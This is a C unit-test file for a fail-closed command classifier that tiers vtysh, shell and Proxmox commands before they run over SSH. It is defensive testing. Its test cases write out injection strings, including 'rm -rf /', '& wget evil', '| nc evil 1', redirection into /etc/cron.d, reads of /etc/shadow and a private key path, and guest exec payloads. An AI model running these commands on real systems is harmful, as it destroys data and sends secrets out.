/*
 * Copyright (c) 2026 Third Level IT LLC. All rights reserved.
 * VIRP — Verified Infrastructure Response Protocol
 * Linux/FRR vtysh gate-classifier unit tests (linux_gate_classify).
 *
 * The linux driver executes raw shell over an SSH exec channel, so the
 * classifier is guard-first: separator policy and the anchored
 * `vtysh -c "<arg>"` form run before any table row, failure = RED.
 * FAIL-CLOSED: anything not explicitly GREEN/YELLOW is RED, and
 * abbreviations are never expanded ("sh ip os nei" must NOT classify).
 * The table never returns BLACK — every RED stays approvable.
 */

#include "virp.h"
#include "virp_driver.h"
#include <stdio.h>
#include <string.h>
#include <assert.h>

/* Under test — exported from driver_linux.c (forward-declared here the
 * way test_driver_cisco_gate.c declares cisco_gate_tier). */
virp_trust_tier_t linux_gate_classify(const char *command, const char **reason);
virp_trust_tier_t linux_gate_tier(const char *command);
const char *linux_gate_reason(const char *command);
int  linux_gate_set_protected_vmids(const char *csv);
void linux_gate_clear_protected_vmids(void);

static int tests_run = 0, tests_passed = 0;
#define TEST(name) do { tests_run++; printf("  [%d] %s ... ", tests_run, name); } while(0)
#define PASS() do { tests_passed++; printf("PASS\n"); } while(0)

/*
 * Gate-level mirror of gate_tier_blocks() in virp_onode.c under the
 * deployed threshold (max tier YELLOW): UNCLASSIFIED and BLACK always
 * block, otherwise anything above YELLOW blocks. Every RED assertion
 * below also asserts the gate DECISION so a classifier regression that
 * returns a passing tier fails here, not on the wire.
 */
static int gate_blocks_at_yellow(virp_trust_tier_t t)
{
    if (t == VIRP_TIER_UNCLASSIFIED) return 1;
    if (t == VIRP_TIER_BLACK)        return 1;
    return t > VIRP_TIER_YELLOW;
}

static void assert_red_blocked(const char *cmd)
{
    virp_trust_tier_t t = linux_gate_tier(cmd);
    assert(t == VIRP_TIER_RED);
    assert(gate_blocks_at_yellow(t));
    assert(t != VIRP_TIER_BLACK);   /* RED stays approvable */
}

/*
 * BLACK — blocked AND unapprovable (2026-08-12).
 *
 * The difference from assert_red_blocked() is the whole point of the
 * tier: virp_onode.c files no proposal for BLACK and refuses the apply
 * path with VIRP_ERR_TIER_VIOLATION before any signature is checked, so
 * these commands cannot be unlocked by an enrolled approval key. The
 * `!= VIRP_TIER_RED` assertion is not redundant — it is the half that
 * fails if someone "fixes" a BLACK row back to approvable.
 */
static void assert_black_blocked(const char *cmd)
{
    virp_trust_tier_t t = linux_gate_tier(cmd);
    assert(t == VIRP_TIER_BLACK);
    assert(t != VIRP_TIER_RED);
    assert(gate_blocks_at_yellow(t));
}

static void test_guard_separators(void)
{
    printf("\n=== Guards — separator policy (evaluated before any row) ===\n");

    TEST("semicolon chain bypass -> RED at guard");
    assert_red_blocked("vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr");
    {
        const char *why = linux_gate_reason(
            "vtysh -c \"show ip ospf neighbor\"; rm -rf /etc/frr");
        assert(why != NULL && strstr(why, "metacharacter") != NULL);
    }
    PASS();

    TEST("pipe inside quoted arg -> RED");
    assert_red_blocked("vtysh -c \"show running-config | include password\"");
    PASS();

    TEST("backtick inside quoted arg -> RED");
    assert_red_blocked("vtysh -c \"show `id` neighbor\"");
    PASS();

    TEST("$( inside quoted arg -> RED");
    assert_red_blocked("vtysh -c \"show $(id) neighbor\"");
    PASS();

    TEST("ampersand -> RED");
    assert_red_blocked("vtysh -c \"show ip route\" & wget evil");
    PASS();

    TEST("newline -> RED");
    assert_red_blocked("vtysh -c \"show ip route\"\nrm -rf /");
    PASS();

    TEST("redirection outside arg -> RED");
    assert_red_blocked("vtysh -c \"show running-config\" > /etc/frr/frr.conf");
    PASS();

    TEST("backslash outside arg -> RED");
    assert_red_blocked("vtysh \\-c \"show ip route\"");
    PASS();
}

static void test_guard_vtysh_form(void)
{
    printf("\n=== Guards — anchored vtysh form ===\n");

    TEST("double -c -> RED always");
    assert_red_blocked("vtysh -c \"show ip ospf neighbor\" -c \"configure terminal\"");
    {
        const char *why = linux_gate_reason(
            "vtysh -c \"show ip ospf neighbor\" -c \"configure terminal\"");
        assert(why != NULL && strstr(why, "-c") != NULL);
    }
    PASS();

    TEST("env-var prefix -> RED");
    assert_red_blocked("FRR_PAGER=cat vtysh -c \"show running-config\"");
    PASS();

    TEST("command prefix -> RED");
    assert_red_blocked("nice vtysh -c \"show ip route\"");
    PASS();

    TEST("missing quotes -> RED");
    assert_red_blocked("vtysh -c show ip ospf neighbor");
    PASS();

    TEST("trailing bytes after closing quote -> RED");
    assert_red_blocked("vtysh -c \"show ip route\" extra");
    PASS();

    TEST("empty quoted arg -> RED");
    assert_red_blocked("vtysh -c \"\"");
    PASS();

    TEST("bare vtysh (interactive shell) -> RED");
    assert_red_blocked("vtysh");
    PASS();
}

/*
 * REGRESSION (2026-08-09): classification was case-insensitive while
 * execution was case-sensitive — `VTYSH -C "SHOW IP OSPF"` classified
 * GREEN on a lowercased copy and the driver then executed the ORIGINAL
 * casing, so the gate signed a GREEN execution of a byte string it
 * never classified. The invariant now pinned: the exact byte string
 * that was classified is the exact byte string that executes, or
 * nothing executes. Case variants of listed rows are unlisted spellings
 * and fall through RED (blocked → signed refusal), exactly as
 * abbreviations always have.
 */
static void test_no_case_folding(void)
{
    printf("\n=== No case folding (classified == executed bytes) ===\n");

    TEST("VTYSH -C \"SHOW IP OSPF\" (the original repro) -> RED");
    assert_red_blocked("VTYSH -C \"SHOW IP OSPF\"");
    PASS();

    TEST("uppercase GREEN row: vtysh -c \"SHOW VERSION\" -> RED");
    assert_red_blocked("vtysh -c \"SHOW VERSION\"");
    PASS();

    TEST("mixed-case scaffold: VtYsH -c \"show version\" -> RED");
    assert_red_blocked("VtYsH -c \"show version\"");
    PASS();

    TEST("uppercase flag: vtysh -C \"show version\" -> RED (form)");
    assert_red_blocked("vtysh -C \"show version\"");
    PASS();

    TEST("mixed-case keyword: vtysh -c \"Show version\" -> RED");
    assert_red_blocked("vtysh -c \"Show version\"");
    PASS();

    TEST("uppercase rest: vtysh -c \"show IP OSPF\" -> RED (charset)");
    assert_red_blocked("vtysh -c \"show IP OSPF\"");
    PASS();

    TEST("uppercase YELLOW row: vtysh -c \"CLEAR IP OSPF NEIGHBOR\" -> RED");
    assert_red_blocked("vtysh -c \"CLEAR IP OSPF NEIGHBOR\"");
    PASS();

    TEST("uppercase peer row: SYSTEMCTL IS-ACTIVE virp-onode -> RED");
    assert_red_blocked("SYSTEMCTL IS-ACTIVE virp-onode");
    PASS();

    TEST("lowercase originals still classify (control)");
    assert(linux_gate_tier("vtysh -c \"show ip ospf\"") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("vtysh -c \"clear ip ospf neighbor\"")
           == VIRP_TIER_YELLOW);
    PASS();
}

static void test_no_abbreviation_expansion(void)
{
    printf("\n=== No abbreviation expansion ===\n");

    TEST("sh ip os nei -> RED (falls through, not expanded)");
    assert_red_blocked("vtysh -c \"sh ip os nei\"");
    assert(linux_gate_reason("vtysh -c \"sh ip os nei\"") == NULL);
    PASS();

    TEST("sho running-config -> RED");
    assert_red_blocked("vtysh -c \"sho running-config\"");
    PASS();

    TEST("conf t -> RED (generic — not the configure row)");
    assert_red_blocked("vtysh -c \"conf t\"");
    PASS();
}

static void test_green(void)
{
    printf("\n=== GREEN — vtysh show reads ===\n");

    TEST("show ip ospf neighbor -> GREEN");
    assert(linux_gate_tier("vtysh -c \"show ip ospf neighbor\"") == VIRP_TIER_GREEN);
    PASS();

    TEST("show running-config -> YELLOW (config read, no scrub in this driver)");
    assert(linux_gate_tier("vtysh -c \"show running-config\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show ip route 10.0.0.0/8 -> GREEN (charset covers ./-)");
    assert(linux_gate_tier("vtysh -c \"show ip route 10.0.0.0/8\"") == VIRP_TIER_GREEN);
    PASS();

    TEST("whitespace runs collapsed (case preserved) -> GREEN");
    assert(linux_gate_tier("  vtysh   -c   \"show  ip  ospf  neighbor\"  ") == VIRP_TIER_GREEN);
    PASS();

    TEST("show with out-of-charset rest -> RED");
    assert_red_blocked("vtysh -c \"show ip_route\"");
    PASS();

    TEST("shower -> RED (token boundary)");
    assert_red_blocked("vtysh -c \"shower\"");
    PASS();
}

static void test_yellow(void)
{
    printf("\n=== YELLOW — bounded operational actions ===\n");

    /* vtysh resolves unambiguous command prefixes, so `show run`
     * EXECUTES as show running-config. No show argument that could
     * resolve to running-config or startup-config may reach the
     * generic GREEN show row — all of them are approval-gated
     * (2026-08-11, completes the credential-leak break-glass). */
    TEST("show run -> YELLOW (vtysh expands to running-config)");
    assert(linux_gate_tier("vtysh -c \"show run\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show ru -> YELLOW (running-config prefix)");
    assert(linux_gate_tier("vtysh -c \"show ru\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show runn -> YELLOW (running-config prefix)");
    assert(linux_gate_tier("vtysh -c \"show runn\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show startup-config -> YELLOW (config read)");
    assert(linux_gate_tier("vtysh -c \"show startup-config\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show start -> YELLOW (startup-config prefix)");
    assert(linux_gate_tier("vtysh -c \"show start\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show star -> YELLOW (startup-config prefix)");
    assert(linux_gate_tier("vtysh -c \"show star\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("show run json -> YELLOW (prefix + trailing modifier)");
    assert(linux_gate_tier("vtysh -c \"show run json\"") == VIRP_TIER_YELLOW);
    PASS();

    /* Neighbouring spellings that do NOT prefix either config word
     * keep their GREEN read classification. */
    TEST("show ip route stays GREEN (not a config-word prefix)");
    assert(linux_gate_tier("vtysh -c \"show ip route\"") == VIRP_TIER_GREEN);
    PASS();

    TEST("show rundown stays GREEN (diverges from running-config)");
    assert(linux_gate_tier("vtysh -c \"show rundown\"") == VIRP_TIER_GREEN);
    PASS();

    TEST("clear ip ospf neighbor -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"clear ip ospf neighbor\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("clear ip ospf neighbor 2.2.2.2 -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"clear ip ospf neighbor 2.2.2.2\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("clear ip ospf interface eth1 -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"clear ip ospf interface eth1\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("ping -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"ping 10.10.12.2\"") == VIRP_TIER_YELLOW);
    PASS();

    TEST("traceroute -> YELLOW");
    assert(linux_gate_tier("vtysh -c \"traceroute 4.4.4.4\"") == VIRP_TIER_YELLOW);
    PASS();
}

static void test_red_teaching_rows(void)
{
    printf("\n=== RED — explicit rows with instructive reasons ===\n");

    TEST("configure terminal -> RED + teaching reason");
    assert_red_blocked("vtysh -c \"configure terminal\"");
    {
        const char *why = linux_gate_reason("vtysh -c \"configure terminal\"");
        assert(why != NULL);
        assert(strstr(why, "configuration change") != NULL);
        assert(strstr(why, "propose/approve/apply") != NULL);
    }
    PASS();

    TEST("configure <anything> -> RED + teaching reason");
    assert_red_blocked("vtysh -c \"configure\"");
    assert(linux_gate_reason("vtysh -c \"configure\"") != NULL);
    PASS();

    TEST("clear ip ospf process -> RED + teaching reason");
    assert_red_blocked("vtysh -c \"clear ip ospf process\"");
    {
        const char *why = linux_gate_reason("vtysh -c \"clear ip ospf process\"");
        assert(why != NULL);
        assert(strstr(why, "propose/approve/apply") != NULL);
    }
    PASS();

    TEST("sed -i on /etc/frr/frr.conf -> RED + teaching reason");
    assert_red_blocked("sed -i s/1/2/ /etc/frr/frr.conf");
    {
        const char *why = linux_gate_reason("sed -i s/1/2/ /etc/frr/frr.conf");
        assert(why != NULL);
        assert(strstr(why, "propose/approve/apply") != NULL);
    }
    PASS();

    TEST("systemctl restart frr -> RED + teaching reason");
    assert_red_blocked("systemctl restart frr");
    assert(linux_gate_reason("systemctl restart frr") != NULL);
    PASS();

    TEST("systemctl stop frr.service -> RED + teaching reason");
    assert_red_blocked("systemctl stop frr.service");
    assert(linux_gate_reason("systemctl stop frr.service") != NULL);
    PASS();
}

static void test_red_by_absence(void)
{
    printf("\n=== RED — fail closed by absence (generic reason) ===\n");

    TEST("cat /etc/frr/frr.conf -> RED by absence (read, not the write row)");
    assert_red_blocked("cat /etc/frr/frr.conf");
    assert(linux_gate_reason("cat /etc/frr/frr.conf") == NULL);
    PASS();

    /* `uptime` was the example of a harmless bare-shell read that is
     * still RED because it is not enumerated. It is enumerated now
     * (test_host_health_reads), so the example moved to a neighbouring
     * spelling that is still unenumerated — the ROW being asserted here
     * is "harmless is not a tier", which is unchanged. */
    TEST("uptime -p -> RED by absence (harmless is not a tier)");
    assert_red_blocked("uptime -p");
    assert(linux_gate_reason("uptime -p") == NULL);
    PASS();

    TEST("write memory (vtysh, unlisted) -> RED by absence");
    assert_red_blocked("vtysh -c \"write memory\"");
    assert(linux_gate_reason("vtysh -c \"write memory\"") == NULL);
    PASS();

    TEST("copy running-config startup-config (unlisted) -> RED");
    assert_red_blocked("vtysh -c \"copy running-config startup-config\"");
    PASS();

    TEST("empty command -> RED");
    assert_red_blocked("");
    PASS();

    TEST("NULL command -> RED");
    assert(linux_gate_classify(NULL, NULL) == VIRP_TIER_RED);
    PASS();
}

static void test_peer_health_rows(void)
{
    printf("\n=== GREEN — peer-health rows (exact match only) ===\n");

    TEST("systemctl is-active virp-onode -> GREEN");
    assert(linux_gate_tier("systemctl is-active virp-onode") == VIRP_TIER_GREEN);
    PASS();

    TEST("chain tail -n 1 -> GREEN");
    assert(linux_gate_tier("/opt/virp/build/virp-tool chain tail -n 1 "
                           "--db /var/lib/virp/chain.db") == VIRP_TIER_GREEN);
    PASS();

    TEST("cat published.json -> GREEN");
    assert(linux_gate_tier("cat /var/lib/virp/autopilot/published.json")
           == VIRP_TIER_GREEN);
    PASS();

    TEST("whitespace canonicalization still matches (case preserved) -> GREEN");
    assert(linux_gate_tier("  systemctl   is-active   virp-onode ")
           == VIRP_TIER_GREEN);
    PASS();

    printf("\n=== RED — adversarial neighbours of the peer rows ===\n");

    /* Taking the gate daemon down was RED-by-absence (the exact-match
     * peer row simply did not cover it). It is now BLACK by an explicit
     * row: RED-by-absence was only ever as strong as "nobody holds an
     * approval key", and somebody does now. */
    TEST("systemctl stop virp-onode -> BLACK (not merely unmatched)");
    assert_black_blocked("systemctl stop virp-onode");
    {
        const char *why = linux_gate_reason("systemctl stop virp-onode");
        assert(why != NULL && strstr(why, "not approvable") != NULL);
    }
    PASS();

    TEST("systemctl restart virp-onode -> BLACK");
    assert_black_blocked("systemctl restart virp-onode"); PASS();

    /* Reads of the daemon's state are NOT the never-class — an extra
     * flag on a read is an unenumerated read, which is ordinary RED. */
    TEST("systemctl is-active virp-onode + extra arg -> RED");
    assert_red_blocked("systemctl is-active virp-onode --quiet"); PASS();

    TEST("systemctl is-enabled virp-onode -> RED (unlisted verb, still a read)");
    assert_red_blocked("systemctl is-enabled virp-onode"); PASS();

    TEST("chain tail with a different -n -> RED");
    assert_red_blocked("/opt/virp/build/virp-tool chain tail -n 50 "
                       "--db /var/lib/virp/chain.db"); PASS();

    TEST("chain tail against a different db -> RED");
    assert_red_blocked("/opt/virp/build/virp-tool chain tail -n 1 "
                       "--db /tmp/evil.db"); PASS();

    TEST("virp-tool keygen via the peer path -> RED");
    assert_red_blocked("/opt/virp/build/virp-tool keygen okey /tmp/k"); PASS();

    TEST("cat of a different file -> RED (one fixed path only)");
    assert_red_blocked("cat /var/lib/virp/autopilot/alerts.jsonl");
    assert_red_blocked("cat /etc/virp/keys/onode.key");
    assert_red_blocked("cat /var/lib/virp/devices.json");
    PASS();

    TEST("cat published.json with a trailing pipe -> RED at the guard");
    assert_red_blocked("cat /var/lib/virp/autopilot/published.json | nc evil 1"); PASS();

    TEST("peer rows do not leak the FRR teaching reasons");
    assert(linux_gate_reason("systemctl is-active virp-onode") == NULL);
    assert(linux_gate_reason("cat /var/lib/virp/autopilot/published.json") == NULL);
    PASS();
}

/* =========================================================================
 * Proxmox VE rows
 *
 * pve-lab is a `linux` device, so the Proxmox table lives behind the same
 * classifier. The protected-VMID set is NOT a constant in the driver — it
 * arrives from devices.json via linux_gate_set_protected_vmids() — so
 * every Proxmox test here declares it first, the way the daemon's device
 * loader does at startup. 313 is this node's own VM.
 * ========================================================================= */

static void prox_setup(void)
{
    linux_gate_clear_protected_vmids();
    assert(linux_gate_set_protected_vmids("313") == 0);
}

static void test_prox_metachar_guard(void)
{
    printf("\n=== Proxmox — raw metacharacter scan runs before any row ===\n");
    prox_setup();

    /* The whole reason the scan is first: "qm list" IS a GREEN row, so a
     * prefix match that ran ahead of the scan would classify the compound
     * string on the strength of its first two words. */
    TEST("qm list; rm -rf / -> RED (never prefix-matches the GREEN row)");
    assert_red_blocked("qm list; rm -rf /");
    {
        const char *why = linux_gate_reason("qm list; rm -rf /");
        assert(why != NULL && strstr(why, "metacharacter") != NULL);
    }
    PASS();

    TEST("pipe -> RED");
    assert_red_blocked("qm list | sh");
    PASS();

    TEST("ampersand -> RED");
    assert_red_blocked("qm list & wget evil");
    PASS();

    TEST("command substitution $( -> RED");
    assert_red_blocked("qm status $(id)");
    PASS();

    TEST("backtick -> RED");
    assert_red_blocked("qm status `id`");
    PASS();

    /* > and < are NOT in virp_command_check_separators — this row is the
     * only thing refusing them, which is why the scan is repeated in full
     * inside the Proxmox branch rather than delegated. */
    TEST("output redirection -> RED");
    assert_red_blocked("qm list > /etc/cron.d/pwn");
    PASS();

    TEST("input redirection -> RED");
    assert_red_blocked("qm list < /etc/shadow");
    PASS();

    TEST("newline -> RED");
    assert_red_blocked("qm list\nrm -rf /");
    PASS();

    TEST("illegal byte in argument -> RED (charset)");
    assert_red_blocked("qm config 100 --name a*b");
    PASS();
}

static void test_prox_green(void)
{
    printf("\n=== Proxmox GREEN — reads ===\n");
    prox_setup();

    TEST("qm list -> GREEN");
    assert(linux_gate_tier("qm list") == VIRP_TIER_GREEN);
    PASS();

    TEST("pct list -> GREEN");
    assert(linux_gate_tier("pct list") == VIRP_TIER_GREEN);
    PASS();

    TEST("pveversion -> GREEN");
    assert(linux_gate_tier("pveversion") == VIRP_TIER_GREEN);
    PASS();

    TEST("pvecm status / pvecm nodes -> GREEN");
    assert(linux_gate_tier("pvecm status") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvecm nodes") == VIRP_TIER_GREEN);
    PASS();

    TEST("pvesm status -> GREEN");
    assert(linux_gate_tier("pvesm status") == VIRP_TIER_GREEN);
    PASS();

    TEST("qm status / qm config <vmid> -> GREEN");
    assert(linux_gate_tier("qm status 100") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("qm config 100") == VIRP_TIER_GREEN);
    PASS();

    TEST("pct status / pct config <vmid> -> GREEN");
    assert(linux_gate_tier("pct status 200") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("pct config 200") == VIRP_TIER_GREEN);
    PASS();

    TEST("pvesh get <path> -> GREEN");
    assert(linux_gate_tier("pvesh get /nodes/pve-lab/qemu/100/config")
           == VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvesh get /cluster/resources") == VIRP_TIER_GREEN);
    PASS();

    TEST("GREEN rows carry no teaching reason");
    assert(linux_gate_reason("qm list") == NULL);
    assert(linux_gate_reason("pvesh get /cluster/resources") == NULL);
    PASS();

    /* Exact shapes, not prefixes: an argument the table has not reasoned
     * about must not ride a permitted verb. */
    TEST("trailing argument on a GREEN row -> RED by absence");
    assert_red_blocked("qm list --full");
    assert_red_blocked("pvecm status extra");
    assert_red_blocked("pvesh get /cluster/resources --output-format json");
    PASS();

    TEST("uppercase spelling -> RED (no case folding, as in the FRR table)");
    assert_red_blocked("QM LIST");
    assert_red_blocked("qm LIST");
    PASS();
}

static void test_prox_yellow(void)
{
    printf("\n=== Proxmox YELLOW — bounded actions ===\n");
    prox_setup();

    TEST("qm start|stop|shutdown|reboot|suspend|resume <vmid> -> YELLOW");
    assert(linux_gate_tier("qm start 100") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm stop 100") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm shutdown 100") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm reboot 100") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm suspend 100") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm resume 100") == VIRP_TIER_YELLOW);
    PASS();

    TEST("qm create|set|clone|migrate -> YELLOW");
    assert(linux_gate_tier("qm create 150 --memory 2048") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm set 100 --onboot 1") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm clone 100 101") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm migrate 100 pve2") == VIRP_TIER_YELLOW);
    PASS();

    TEST("pct equivalents -> YELLOW");
    assert(linux_gate_tier("pct start 200") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("pct shutdown 200") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("pct migrate 200 pve2") == VIRP_TIER_YELLOW);
    PASS();

    TEST("pvesh create|set -> YELLOW");
    assert(linux_gate_tier("pvesh create /nodes/pve-lab/qemu/100/status/start")
           == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("pvesh set /nodes/pve-lab/qemu/100/config --onboot 1")
           == VIRP_TIER_YELLOW);
    PASS();

    TEST("vzdump (backup, no deletion flag) -> YELLOW");
    assert(linux_gate_tier("vzdump 100 --storage local") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("vzdump --all") == VIRP_TIER_YELLOW);
    PASS();

    /* Taking a snapshot is additive and is what an operator does BEFORE
     * a risky change — gating it harder than the change would be
     * backwards. Deleting one destroys a restore point and is not the
     * same action. */
    TEST("qm|pct snapshot -> YELLOW, delsnapshot -> RED by absence");
    assert(linux_gate_tier("qm snapshot 100 pre-change") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("pct snapshot 200 pre-change") == VIRP_TIER_YELLOW);
    assert_red_blocked("qm delsnapshot 100 pre-change");
    PASS();

    /*
     * The access tree is a READ that returns credential material, and an
     * observation body is signed into a chain that cannot be trimmed —
     * so it is deliberately not GREEN. Asserted as "not GREEN" as well as
     * "== YELLOW": the requirement is that it never rides the read row,
     * and that half must survive any future retiering.
     */
    TEST("pvesh get /access/... -> YELLOW, and never GREEN");
    assert(linux_gate_tier("pvesh get /access/users") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("pvesh get /access/users") != VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvesh get /access") != VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvesh get /access/roles") != VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvesh get /access/users/root@pam/token")
           != VIRP_TIER_GREEN);
    PASS();
}

static void test_prox_red(void)
{
    printf("\n=== Proxmox RED — destruction and execution-by-proxy ===\n");
    prox_setup();

    TEST("qm destroy / pct destroy -> BLACK (no approval path)");
    assert_black_blocked("qm destroy 100");
    assert_black_blocked("pct destroy 200");
    {
        const char *why = linux_gate_reason("qm destroy 100");
        assert(why != NULL && strstr(why, "destruction") != NULL);
        assert(strstr(why, "not approvable") != NULL);
    }
    PASS();

    TEST("pvesh delete -> BLACK");
    assert_black_blocked("pvesh delete /nodes/pve-lab/qemu/100");
    PASS();

    /* Arbitrary execution inside a guest is a classifier bypass by
     * proxy: the gate would sign "ran a classified command" over a
     * payload it never classified. */
    TEST("qm guest exec -> RED");
    assert_red_blocked("qm guest exec 100 rm -rf /");
    {
        const char *why = linux_gate_reason("qm guest exec 100 ls");
        assert(why != NULL && strstr(why, "bypass") != NULL);
    }
    PASS();

    TEST("pct exec / pct enter (the container equivalents) -> RED");
    assert_red_blocked("pct exec 200 rm -rf /");
    assert_red_blocked("pct enter 200");
    PASS();

    TEST("unlisted pvesh method -> RED by absence");
    assert_red_blocked("pvesh ls /nodes");
    assert_red_blocked("pvesh usage /nodes");
    PASS();

    TEST("unlisted Proxmox verb -> RED by absence");
    assert_red_blocked("qm rescan");
    assert_red_blocked("qm unlock 100");
    assert_red_blocked("pveceph status");
    PASS();

    TEST("bare tool with no verb -> RED");
    assert_red_blocked("qm");
    assert_red_blocked("pvesh");
    assert_red_blocked("pvesh get");
    PASS();

    TEST("pvesh path that is not a path -> RED");
    assert_red_blocked("pvesh get nodes");
    PASS();
}

/*
 * SELF-PROTECTION — the row this classifier exists for.
 *
 * `qm stop 313` is an ordinary bounded YELLOW action on any other guest
 * and is this gate powering itself off on 313. Nothing downstream can
 * tell the two apart, so the VMID is judged before a tier exists, and
 * its RED cannot be outranked by a permitted verb.
 */
static void test_prox_self_protection(void)
{
    printf("\n=== Proxmox SELF-PROTECTION — protected VMIDs ===\n");
    prox_setup();

    TEST("qm stop 313 -> BLACK (the requirement, stated plainly)");
    assert_black_blocked("qm stop 313");
    {
        const char *why = linux_gate_reason("qm stop 313");
        assert(why != NULL && strstr(why, "protected VMID") != NULL);
        assert(strstr(why, "not approvable") != NULL);
    }
    PASS();

    TEST("protected VMID is BLACK at every verb, including the GREEN reads");
    assert_black_blocked("qm status 313");
    assert_black_blocked("qm config 313");
    assert_black_blocked("qm start 313");
    assert_black_blocked("qm shutdown 313");
    assert_black_blocked("qm destroy 313");
    assert_black_blocked("qm migrate 313 pve2");
    assert_black_blocked("qm snapshot 313 pre-change");
    PASS();

    TEST("pct rows honour the same set");
    assert_black_blocked("pct stop 313");
    assert_black_blocked("pct status 313");
    PASS();

    TEST("pvesh /nodes/*/qemu/313 -> BLACK");
    assert_black_blocked("pvesh get /nodes/pve-lab/qemu/313/config");
    assert_black_blocked("pvesh create /nodes/pve-lab/qemu/313/status/stop");
    assert_black_blocked("pvesh delete /nodes/pve-lab/qemu/313");
    PASS();

    TEST("pvesh /nodes/*/lxc/313 -> BLACK");
    assert_black_blocked("pvesh get /nodes/pve-lab/lxc/313/config");
    PASS();

    /* argv[2] is the documented VMID position, but `qm clone 100 313`
     * names the protected id in argv[3] and `vzdump 313` names it with no
     * verb at all. Every numeric argument is checked. */
    TEST("protected VMID in a non-leading argument -> BLACK");
    assert_black_blocked("qm clone 100 313");
    assert_black_blocked("vzdump 313");
    PASS();

    /* The documented over-reach, restated at the new tier: an indirect
     * reference in a `qm set` argument list is refused even though 313
     * is a memory size there, not a target. A wrong refusal is a config
     * edit; a wrong permit is the gate. */
    TEST("indirect 313 reference in qm set args -> BLACK (over-reach, intended)");
    assert_black_blocked("qm set 100 --memory 313");
    assert_black_blocked("qm set 100 --cores 2 --memory 313");
    PASS();

    TEST("qm guest exec against the protected VMID -> BLACK");
    assert_black_blocked("qm guest exec 313 poweroff");
    PASS();

    TEST("unprotected VMIDs are unaffected (control)");
    assert(linux_gate_tier("qm stop 100") == VIRP_TIER_YELLOW);
    assert(linux_gate_tier("qm status 100") == VIRP_TIER_GREEN);
    assert(linux_gate_tier("pvesh get /nodes/pve-lab/qemu/3130/config")
           == VIRP_TIER_GREEN);
    PASS();

    TEST("the set is config-driven, not a constant — add 400, 400 goes BLACK");
    assert(linux_gate_tier("qm stop 400") == VIRP_TIER_YELLOW);
    assert(linux_gate_set_protected_vmids("400") == 0);
    assert_black_blocked("qm stop 400");
    assert_black_blocked("qm stop 313");      /* union, not replacement */
    prox_setup();
    PASS();

    TEST("unparseable protected_vmids is refused, and protects nothing");
    linux_gate_clear_protected_vmids();
    assert(linux_gate_set_protected_vmids("313,notanumber") != 0);
    assert(linux_gate_set_protected_vmids("313 400") != 0);
    prox_setup();
    PASS();
}

/*
 * A VMID position that is EXPECTED but does not parse is RED — it never
 * falls through to "well, the verb is YELLOW". Without this, an argument
 * the classifier could not read would be judged by the only part of the
 * command it could.
 */
static void test_prox_unparseable_vmid(void)
{
    printf("\n=== Proxmox — expected-but-unparseable VMID -> RED ===\n");
    prox_setup();

    TEST("qm stop notanumber -> RED (not YELLOW on the verb)");
    assert(linux_gate_tier("qm stop notanumber") == VIRP_TIER_RED);
    {
        const char *why = linux_gate_reason("qm stop notanumber");
        assert(why != NULL && strstr(why, "VMID") != NULL);
    }
    PASS();

    TEST("qm stop with no VMID at all -> RED");
    assert_red_blocked("qm stop");
    PASS();

    TEST("partially-numeric VMID -> RED");
    assert_red_blocked("qm status 31x");
    assert_red_blocked("qm status 3.13");
    assert_red_blocked("qm status -313");
    PASS();

    TEST("pvesh qemu/lxc path with an unparseable VMID -> RED");
    assert_red_blocked("pvesh get /nodes/pve-lab/qemu/all/config");
    assert_red_blocked("pvesh get /nodes/pve-lab/lxc//config");
    assert_red_blocked("pvesh get /nodes/pve-lab/qemu");
    PASS();

    TEST("GREEN read of a well-formed VMID still works (control)");
    assert(linux_gate_tier("qm status 100") == VIRP_TIER_GREEN);
    PASS();
}

/*
 * The set is configuration, so "not configured yet" is a real state and
 * it must not read as "nothing is protected". An operator who has not
 * added the field and one who added an empty list are making different
 * claims; only the second one is a claim at all.
 *
 * Runs LAST among the Proxmox suites and restores the set on the way
 * out, so it cannot leave the registry cleared under a later test.
 */
static void test_prox_unconfigured_is_closed(void)
{
    printf("\n=== Proxmox — unconfigured protected_vmids fails closed ===\n");
    linux_gate_clear_protected_vmids();

    TEST("VMID-bearing commands are RED with no protected set");
    assert_red_blocked("qm stop 313");
    assert_red_blocked("qm status 100");
    assert_red_blocked("pvesh get /nodes/pve-lab/qemu/100/config");
    {
        const char *why = linux_gate_reason("qm stop 313");
        assert(why != NULL && strstr(why, "protected_vmids") != NULL);
    }
    PASS();

    TEST("commands with no VMID are unaffected");
    assert(linux_gate_tier("qm list") == VIRP_TIER_GREEN);
